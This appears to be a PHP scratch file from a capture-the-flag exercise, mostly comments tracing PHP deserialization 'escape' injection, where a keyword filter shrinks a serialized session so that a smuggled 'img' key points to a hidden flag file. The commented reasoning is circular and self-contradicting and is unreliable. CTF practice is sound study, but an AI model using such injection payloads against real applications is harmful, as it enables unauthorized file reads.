<?php
// After PHP reads 51 bytes and finds ";, it continues parsing from position 53.
// 
// Position 53 onwards: s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// But wait, the array count is 3, and we've already parsed:
// - user (key)
// - guest (value)
// - function (key)
// - [51 bytes of content] (value)
// 
// So we've parsed 2 elements. We need 1 more element!
// 
// PHP continues parsing from position 53: s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP parses:
// s:20:"Z3Vlc3RfaW1nLnBuZw==" - this is a string, not a key!
// 
// PHP expects a key (s:N:"key"), but sees s:20:"Z3Vlc3RfaW1nLnBuZw=="
// 
// Hmm, this is a string of length 20, which PHP would parse as a value, not a key!
// 
// But the array format is: key;value;key;value;...
// 
// So PHP expects a key after the function value, but sees a string!

// Let me trace through the entire parsing:
// 
// Filtered: a:3:{s:4:"user";s:5:"guest";s:8:"function";s:51:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP parses:
// a:3:{ - array with 3 elements
// s:4:"user" - key 1
// s:5:"guest" - value 1
// s:8:"function" - key 2
// s:51:" - value 2
//   PHP reads 51 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img
//   PHP finds "; and continues
//   
// Now PHP is at position 53 (relative to content start): s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// But wait, the content is relative to position 49, not position 0!
// 
// Let me recalculate:
// 
// After reading 51 bytes from position 49, PHP is at position 49 + 51 = 100.
// After reading "; (closing quote and semicolon), PHP is at position 100 + 2 = 102.
// 
// Position 102 onwards: s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP parses:
// s:20:"Z3Vlc3RfaW1nLnBuZw==" - this is a string of length 20
// 
// But PHP expects a key for the 3rd element!
// 
// PHP sees s:20:..., which is a string, not a key!
// 
// Wait, in the serialized format, keys are also strings (s:N:"key").
// So s:20:"Z3Vlc3RfaW1nLnBuZw==" could be a key!
// 
// PHP parses:
// s:20:"Z3Vlc3RfaW1nLnBuZw==" - key 3 (this is "Z3Vlc3RfaW1nLnBuZw==")
// 
// Then PHP expects a value:
// ;s:20:"Z3Vlc3RfaW1nLnBuZw==";} - wait, this doesn't make sense!

// Let me trace through more carefully.
// 
// After position 102, the remaining string is: s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP parses:
// s:20:" - string of length 20
//   PHP reads 20 bytes: Z3Vlc3RfaW1nLnBuZw==
//   PHP finds "; and continues
// 
// Now PHP is at position 102 + 26 = 128 (after s:20:"Z3Vlc3RfaW1nLnBuZw==";)
// 
// Position 128 onwards: }
// 
// PHP parses:
// } - end of array
// 
// But the array count is 3, and we've only parsed 2 elements!
// 
// Wait, we've parsed:
// - user = guest
// - function = [51 bytes of content]
// - [key 3] = Z3Vlc3RfaW1nLnBuZw==
// 
// But we don't have a value for key 3!
// 
// PHP expects: key;value
// But we have: key (no value!)
// 
// Error!

// So the issue is that after the 51-byte content, the remaining string doesn't have
// a proper key-value pair!

// Let me think about what we need:
// 
// After the 51-byte content, the remaining string should be:
// s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// But the remaining string is:
// s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// The "s:3:"img";" part is missing!

// Wait, the 51-byte content includes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img
// 
// This includes ";s:3:"img"; which should be parsed as a key-value pair!
// 
// But PHP reads this as part of the function value, not as separate elements!

// I think the key insight is:
// PHP reads the 51 bytes as the VALUE of function.
// After reading the value, PHP expects the next element (key;value).
// 
// But the remaining string is: s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// This is not a valid key-value pair!

// The issue is that our injection ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img
// is being read as the VALUE, not as separate elements!

// So the escape trick doesn't work as I thought!

// Let me think about this differently.
// 
// The key insight: we want to inject a new img key-value pair.
// 
// The injection ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img
// includes ";s:3:"img"; which should close the current value and add a new img key.
// 
// But PHP reads the entire 51 bytes as the VALUE, not parsing the ";s:3:"img"; as separate!

// So the escape trick for SHRINKING is different from EXPANSION!
// 
// For SHRINKING: PHP reads past the closing quote, but the content is read as the VALUE,
// not as separate elements!
// 
// For EXPANSION: PHP reads N bytes and stops, leaving extra bytes as the next element.

// So for SHRINKING, we need a different approach!

// Let me think about how to make the escape work for SHRINKING.
// 
// The key insight: after PHP reads the VALUE, it expects the next key-value pair.
// 
// If we can make the remaining string after the VALUE be a valid key-value pair,
// PHP will parse it!

// The remaining string after the 51-byte VALUE is: s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// This is not a valid key-value pair!
// 
// We need the remaining string to be: s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// But the ";s:3:"img";" part is inside the 51-byte VALUE!

// So the escape trick for SHRINKING doesn't inject new elements!
// 
// The content is read as the VALUE, not as separate elements!

// Let me reconsider the approach.
// 
// What if we use the escape to consume the ENTIRE remaining structure?
// 
// The remaining structure after the function value is: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Length: 33 bytes
// 
// If we generate 33 bytes of overflow, PHP reads the entire remaining structure
// as part of the function VALUE.
// 
// Then PHP expects the next key-value pair, but there's nothing left!
// 
// Error!

// Hmm, this is tricky. Let me think about a different approach.

// What if we use the escape to inject content that closes the array early?
// 
// The injection: ";}s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// This includes ";} which should close the function value and the array!
// 
// But PHP reads the entire injection as the VALUE, not parsing the ";} as separate!

// So the escape trick for SHRINKING doesn't work as I thought!

// Let me search for the correct technique for SHRINKING escapes.

// Actually, I think the key insight is:
// For SHRINKING, we need to make the VALUE end right before a valid key-value pair!
// 
// If we have:
// s:N:"";KEY;VALUE;...
// 
// And N is chosen so that PHP reads N bytes from "" and the next chars are KEY;VALUE,
// PHP will parse KEY;VALUE as the next element!

// But in our case, the next chars after the VALUE are: s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// This is not a valid key (it's a string of length 20, not a key like s:3:"img")!

// So we need to adjust the injection so that after the VALUE, the next chars are
// a valid key-value pair!

// The injection is: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// After the injection, the remaining string is: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Wait, that's not right. Let me recalculate.

// The filtered string is:
// a:3:{s:4:"user";s:5:"guest";s:8:"function";s:51:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// After s:51:"";, the remaining string is:
// ;s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Wait, there's a semicolon before s:3:"img"!
// 
// Let me trace through:
// s:51:"";s:3:"img";...
// 
// After the opening quote at s:51:", the content is: ";s:3:"img";...
// 
// PHP reads 51 bytes from ";s:3:"img";...
// 
// The first char is: " (closing quote of empty string)
// 
// Hmm, I think I'm still confused about the structure.

// Let me print the filtered string with positions.

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$injection = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';

$_SESSION = [];
$_SESSION['user'] = 'guest';
$_SESSION['function'] = 'phpphpflag' . $injection;
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

$serialized = serialize($_SESSION);
$filtered = filter($serialized);

echo "Filtered string with positions:\n";
for ($i = 0; $i < strlen($filtered); $i++) {
    echo "$i: '" . $filtered[$i] . "'\n";
}

